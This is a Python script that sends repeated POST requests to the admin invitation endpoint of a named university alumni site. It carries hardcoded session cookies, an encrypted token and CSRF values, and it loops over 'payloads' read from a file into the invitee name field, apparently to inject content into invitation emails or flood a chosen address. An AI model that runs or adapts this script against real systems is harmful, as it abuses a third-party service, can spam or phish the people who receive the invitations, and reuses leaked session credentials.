import requests

def send_post_request(email, payload, num_times):
    url = "https://alumni.dituniversity.edu.in/api/admin/inviteToPlatform"

    headers = {
        "Host": "<DELETED>",
        "Cookie": "_gcl_au=1.1.2110751493.1700827779; _ga_9VQ1E7MXJ0=GS1.1.1701095920.3.1.1701096944.60.0.0; _ga=GA1.1.1048041271.1700827783; _fbp=fb.2.1700827812648.1969386697; tz=Asia%2FKolkata; _ga_L30C3Q76J7=GS1.1.1705416870.4.1.1705416887.0.0.0; lgdomain=.alumni.dituniversity.edu.in; u_i=3967085; c_i=1272; l_c=1703238882XQ2ulS0fRdjJVatwPrDMG6XxI1P56x; r_v=1; mul=1272; as_ed=%7B%22bu%22%3A%7B%22uids%22%3A%5B%5D%2C%22fetchtime%22%3A1705416869%7D%7D; ast_login_id=12629414; encToken=8be665eecb3ce3d7f7862e775b90519814ea5c465521b6cfe9e0995bb9515ff89307c385b156043f473ca7ea9dd52d2ad556af52227aaf8e005bd056c0be3151; cthm=eyJjdXN0b21fY3NzIjoiLmZpeGVkLWhlYWRlci1oZWlnaHQtYWRqdXN0bWVudHtoZWlnaHQ6IHVuc2V0ICFpbXBvcnRhbnQ7fS5maXhlZC1oZWFkZXItZXh0cmEtZGl2LWhlaWdodHtoZWlnaHQ6IDE1NnB4ICFpbXBvcnRhbnQ7fUBtZWRpYSBvbmx5IHNjcmVlbiBhbmQgKG1heC13aWR0aDogODQxcHgpey5maXhlZC1oZWFkZXItZXh0cmEtZGl2LWhlaWdodHtoZWlnaHQ6IDEyOHB4ICFpbXBvcnRhbnQ7fX0ubWRsLWNvbG9yLS13aGl0ZS10aGVtZWR7YmFja2dyb3VuZC1jb2xvcjogI2ZmZmZmZiAhaW1wb3J0YW50O30ubWRsLWNvbG9yLS1ncmV5LTEwMC10aGVtZWR7YmFja2dyb3VuZC1jb2xvcjogcmdiKDI0NSwyNDUsMjQ1KSAhaW1wb3J0YW50O30ubWRsLWNvbG9yLS1ncmV5LTkwMC10aGVtZWR7YmFja2dyb3VuZC1jb2xvcjogIzFmMzM0NSAhaW1wb3J0YW50O30ubWRsLWNvbG9yLS1wcmltYXJ5LXRoZW1lZHtiYWNrZ3JvdW5kLWNvbG9yOiAjMWQyMDI1ICFpbXBvcnRhbnQ7fS5tZGwtY29sb3ItLXByaW1hcnktZGFyay10aGVtZWR7YmFja2dyb3VuZC1jb2xvcjogIzFkMjAyNSAhaW1wb3J0YW50O30ubWRsLWNvbG9yLXRleHQtLXdoaXRlLXRoZW1lZHtjb2xvcjogI2ZmZmZmZiAhaW1wb3J0YW50O31AbWVkaWEgb25seSBzY3JlZW4gYW5kIChtaW4td2lkdGg6IDg0MXB4KXsubm8tcGFkZGluZy0tYXMtaGVhZGVyLXRoZW1lZHtwYWRkaW5nLXRvcDogMjRweDt9LnBhZ2Utc3RyaXAtdGhlbWVke3BhZGRpbmctdG9wOiA2OHB4O30ucGFnZS1zdHJpcC1jaGFuZ2UtdGhlbWVke3BhZGRpbmctdG9wOiAyOHB4O30uYWJvdXQtc3RyaXAtdGhlbWVke3BhZGRpbmctdG9wOiA4NHB4O30uYWJvdXQtc3RyaXAtY2hhbmdlLXRoZW1lZHtwYWRkaW5nLXRvcDogNDlweDt9LnNpbmdsZS10aXRsZS1zdHJpcC10aGVtZWR7cGFkZGluZy10b3A6IDk2cHg7fX0uYmx1ci1iYWNrZ3JvdW5kLTN7YmFja2dyb3VuZC1ibGVuZC1tb2RlOmNvbG9yICFpbXBvcnRhbnQ7fS5zbGlkZXItYmctZ3JhZGllbnR7YmFja2dyb3VuZDp0cmFuc3BhcmVudCAhaW1wb3J0YW50fSIsImxvZ29fdHlwZSI6IjIiLCJwcmltYXJ5IjoiIzA3MkU1NyIsInByaW1hcnlfbGlnaHQiOiIjMDA5NERBIiwicHJpbWFyeV9kYXJrIjoiIzAwOTREQSIsInNlY29uZGFyeSI6IiMwNzJFNTcifQ%3D%3D; PHPSESSID=1ja8ufajdch1fh85slhl5p32l4",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/json",  
        "X-Csrf": "151a503bf48d5a908e83b9b0c1301a50",
        "Csrf": "151a503bf48d5a908e83b9b0c1301a50",
        "X-Spacid": "1272",
        "Spacid": "1272",
        "X-Utctimediffminutes": "330",
        "X-Timezone": "Asia/Kolkata",
        "Origin": "https://alumni.dituniversity.edu.in",
        "Referer": "https://alumni.dituniversity.edu.in/noticeboard",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Te": "trailers",
        "Connection": "close"
    }

    base_data = {
        "roleString": "alumni",
        "personName": payload,
        "email": email
    }

    for _ in range(num_times):
        try:
            response = requests.post(url, headers=headers, json=base_data)
            response_json = response.json()

            if "success" in response_json and response_json["success"] == 1:
                print(f"Payload: {payload}, Email: {email}, Invitation Successful")
            else:
                print(f"Payload: {payload}, Email: {email}, Invitation Failed. Response: {response_json}")

        except Exception as e:
            print(f"Payload: {payload}, Email: {email}, Exception: {e}")

def main():
    email = input("Enter the email address: ")
    names_file_path = "names.txt"  
    num_times = int(input("Enter the number of times to send the request: "))

    with open(names_file_path, "r") as file:
        names = file.read().splitlines()

    for name in names:
        send_post_request(email, name, num_times)

if __name__ == "__main__":
    main()
